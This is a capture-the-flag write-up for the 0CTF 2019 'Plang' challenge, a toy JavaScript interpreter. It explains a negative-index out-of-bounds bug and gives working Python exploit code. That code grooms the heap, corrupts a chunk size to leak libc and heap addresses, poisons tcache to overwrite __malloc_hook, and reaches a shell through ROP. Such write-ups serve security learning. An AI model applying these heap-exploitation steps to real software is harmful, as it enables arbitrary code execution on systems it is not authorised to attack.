## Plang

This is a challenge that I failed to solve during the contest since I've got into wrong direction. After contest I read [this](https://changochen.github.io/2019-03-23-0ctf-2019.html) and [this](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#plang) for some hints, and solved it in my own way.

### Overview

The program is a mini JavaScript interpreter engine, with [grammar](grammar.md) given. The vulnerability is an array-out-of-bound when the index of array access is a negative `int32_t`. However, the PoC given does not produce signed extension when negative `uint32_t` is converted into 64-bit index to access the array element. Here is where I've got stuck: I tried to exploit the program with only such unsigned extension, but although this might work, the time needed is far more than `alarm` limitation. I might share my initial approach later. Therefore, the correct approach is to use negative index like this `a[-2] = 1`.

### Data Structure Layout

2 important data structures most useful for exploitation are `string` and `array`, let's see their memory layout.

This is **array**:

```
pwndbg> x/40gx 0x55555578de90
0x0000000000001040	0x0000000000004010 // prev_size and size of ptmalloc chunk
0x0000000000000004	0x4000000000000000
//each element is a `0x4` followed by a `double` floating point number
//which is the numeric value of array element
//`0x4` might be enum that specify this is a `double` type
//there is no integer array element in this interpreter
//in this example, the array is [2,2,2,2,...]
0x0000000000000004	0x4000000000000000
0x0000000000000004	0x4000000000000000
//...
```

This is **string**:

```
x/40gx 0x555555789610
0x0000000000000830	0x0000000000001030
0x0000000000000005	0x000055555577c120
//there are some pointers that should not be changed
0x0000555555788b00	0x00001000f144edc5
//0x00001000 is length of the string, 
//0xf144edc5 seems to be hash of the string
0x3131313131313131	0x3131313131313131
0x3131313131313131	0x3131313131313131
//....
```

### Exploitation

Initially I tried to allocate big chunks of string and array so that they will be allocated using `mmap` just before `libc` memory, so that the offset from them to `libc` is constant. Then change the size of string using underflow OOB, then use that string to read/write memory in `libc`. However, this does not work, because `0x4` will also be written to memory of string, and it overlaps with a pointer and will cause segmentation fault when we use that string again.

Instead, I tried to write the size of `ptmalloc` memory chunk meta data. To be specific, I tried to change the `size` field of the chunk and cause overlapping, then leak `libc` address by having a `unsorted bin` on memory region of string.

Therefore, we need a **heap layout** like this

```
1. array, its `chunk size` is going to be overwritten 
2. array, whose size should be smaller than array 1
3. string, whose size should be comparatively big to ensure the addresses will lay inside it
4. array, used to trigger OOB vuln
```

`1-4` should be adjacent without any other chunks lay between them. Such situation is a bit hard to produce. A point to note is the existence of array `2`: we need it to prevent pointers in string 3 from being overwritten. The reason is that in this interpreter, we cannot create an array with fixed large size directly, but can only produce an empty array first and add elements later (this is the case even if we use `var a = [1,2,3,4,5]`); when the array is enlarged, the size of memory will always be doubled (like the implementation of `std::vector`). If we don't have `array 2`, the `unsorted bin` will overlap precisely with `string 3` and overwrite pointers at the beginning of string when trying to write `libc` address onto memory of `string 3`, and this is not what we want.

However, as I said, such heap layout is hard to produce. When we continuously enlarge the size of array or string, `realloc` will cause initial small chunks to be freed, which produces many fragments that may lay between the objects that we allocated; also the order of heap objects in memory layout does not have to be identical as order of allocation, which causes a different layout. To avoid these problems and achieve the effect we want, we can do this:

```python
exp1 = '''var x = "11111111111111111111111111111111"
var i = 0 while (i < 7) {x = x + x i = i + 1 System.gc()}
var j = 0 var ba = [] while (j < 0x100) { ba.add(1) j = j + 1 System.gc()}
var bec = [1,2,3,4,5,6,7,8]
var bed = [1,2,3,4,5,6,7,8]
bec = 0
bed = 0
System.gc()'''
# perform last x = x + x after 2 arrays are allocated
# to prevent small fragments to lay between objects
exp2 = '''x = x + x System.gc()
j = 0 var bb = [] while (j < 0x400) { bb.add(2) j = j + 1 System.gc()}
System.gc()'''
#it seems that it is better to have System.gc() in each loop
#the sizes are obtained by trial and error
send_payload(exp1.split('\n'))

#try to remove a chunk from bins, 
#otherwise `prev_size != size` will occur for that chunk 
send_payload([
	"j = 0 var bea = [] while (j < 0x10) { bea.add(0x1000) j = j + 1 System.gc()}",
	"j = 0 var beb = \"%s\"" % ('A' * 0x70)])#consume a bin
#now heap:
#1. string x '111'
#2. ba

#payloads = []
#for i in xrange(4):
#	payloads.append("j = 0 var be%s = [1,2,3,4]" % chr(ord('a') + i))
#too many fragments :(
send_payload(["j = 0 var baa = [] while (j < 0x80) { baa.add(1) j = j + 1 System.gc()}"])
send_payload(exp2.split('\n'))
#now heap layout:
#1. ba -> try to change chunk size for this one 
#2. baa 0x55555578b650
#3. x 
#4. bb
```

Then it's time to **leak the addresses**.

Firstly we change the chunk size of `ba` to wrap `ba`, `baa` and `x`, so when this big chunk is consumed, the addresses in `unsorted bin` will be written to string `x` so we can leak it.

```python
send_payload(["bb[%d]=%s" % (-0x386, qword_to_double(0x1010+0x810+0x2030+1)), #change chunk size of `ba`
	"ba = 0","System.gc()"]) # free(ba) 0x55555578a640

send_payload(["j = 0 var bc = [] while (j < 0x100) { bc.add(2019) j = j + 1 System.gc()}"])
#This `bc` is also some neccessary consumption of freed bins
send_payload(["j = 0 var bca = [] while (j < 0x101) { bca.add(2019) j = j + 1 System.gc()}"])
#now heap address and libc address have been shoot to x 0x7b0

leak = ""
for i in xrange(0x7b0,0x7b8):
	leak += send_payload(["System.print(x[%d])" % i], True)
	send_payload(["System.gc()"])
libc_addr = u64(leak) - 0x3ebca0

leak = ""
for i in xrange(0x7c0,0x7c8):
	leak += send_payload(["System.print(x[%d])" % i], True)
	send_payload(["System.gc()"])
heap_addr = u64(leak)

print hex(libc_addr),hex(heap_addr)
```

Then we have address leak, then we need to find ways to **get shell**. Since this is `libc-2.27`, there is a `struct` `tcache_perthread_struct` at the beginning of the heap. We can rewrite the entry of such structure to poison the `tcache`. Luckily, `0x50` chunk head is at `xxx8` memory address so we can rewrite it using our own value (note we always have `0x4` at `xxx0` address). We can rewrite it to `&__malloc_hook` so we can rewrite this function pointer. The `one_gadget` does not seem to work very well since the pre-condition does not satisfy, but we can control a large piece of stack memory, so we can do ROP. 

```python
send_payload(["bb[%d]=%s" % (-0x1ae4, qword_to_double(libc_addr + e.symbols["__malloc_hook"] - 0x20))])
payload = "var s2 = [%s,2,3,1]" % qword_to_double(libc_addr + 0x162ea3)
#0x162ea3 : add rsp, 0x520 ; pop rbx ; ret
assert len(payload) < 0x2b0
payload = payload.ljust(0x2b0, '\x00')
payload += p64(libc_addr + 0x4f322) #one gadget
payload += '\x00' * 0x60 #satisfy condition
send_payload(["var s1 = [1,2,3,4]"])
sh.sendline(payload)
```

The data structure that I use does not seem to be that `array` one, but it still writes our floating point number to the memory being allocated. Another thing to note is that the reason why `__free_hook` might not work very well is that there is a `stdin lock` structure before `__free_hook`, and the `fgets` function will get stuck if we tamper it. In this case we must use the `array` structure because it won't tamper much memory before the target, but this is going to use `realloc` to enlarge memory, and the weird thing is `realloc` will not use memory chunks in `tcache`. `:(`

[Full Exploit Script](plang.py)